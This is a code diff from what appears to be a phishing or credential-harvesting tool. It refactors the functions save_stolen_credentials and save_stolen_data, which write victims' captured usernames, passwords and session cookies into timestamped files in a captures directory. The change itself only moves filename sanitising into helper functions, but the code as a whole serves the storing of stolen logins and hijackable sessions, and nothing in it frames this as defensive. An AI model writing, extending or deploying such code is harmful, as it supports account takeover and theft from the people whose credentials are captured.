@@ -13,18 +13,25 @@ def make_captures_dir() -> None:
     """Creates the captures directory if it doesn't exist"""
     get_captures_dir().mkdir(exist_ok=True)
 
+def get_safe_username(username: str) -> str:
+    """Returns a safe version of the username for use in file names"""
+    return sub(r"[^a-zA-Z0-9._-]", "_", username)
+
+def get_file_name(username: str, suffix: str, utc_now: datetime) -> str:
+    """Returns a safe file name for the given username and suffix"""
+    utc_now_formatted = utc_now.strftime('%Y%m%dT%H%M%S')
+    safe_username = get_safe_username(username)
+    return f"{utc_now_formatted}-{safe_username}_{suffix}.txt"
+
 def save_stolen_credentials(username: str, password: str) -> None:
     """Saves the stolen credentials to a text file in the captures directory"""
     try:
         make_captures_dir()
 
         utc_now = datetime.now(timezone.utc)
-        utc_now_formatted = utc_now.strftime('%Y%m%dT%H%M%S')
 
-        safe_username = sub(r"[^a-zA-Z0-9._-]", "_", username)
+        file = get_captures_dir() / get_file_name(username, "credentials", utc_now)
 
-        file_name = f"{utc_now_formatted}-{safe_username}_credentials.txt"
-        file = get_captures_dir() / file_name
         content = (
             f"Data acquired at: {utc_now} (UTC)\n"
             f"Username: {username}\n"
@@ -44,13 +51,9 @@ def save_stolen_data(login_flow: LoginFlow) -> None:
         make_captures_dir()
 
         utc_now = datetime.now(timezone.utc)
-        utc_now_formatted = utc_now.strftime('%Y%m%dT%H%M%S')
 
         username = login_flow.username or ""
-        safe_username = sub(r"[^a-zA-Z0-9._-]", "_", username)
-
         password = login_flow.password or ""
-
         cookies = [
             {
                 "name": cookie.name,
@@ -64,8 +67,8 @@ def save_stolen_data(login_flow: LoginFlow) -> None:
             for cookie in login_flow.session.cookies
         ]
 
-        file_name = f"{utc_now_formatted}-{safe_username}_data.txt"
-        file = get_captures_dir() / file_name
+        file = get_captures_dir() / get_file_name(username, "data", utc_now)
+
         content = (
             f"Data acquired at: {utc_now} (UTC)\n"
             f"Username: {username}\n"
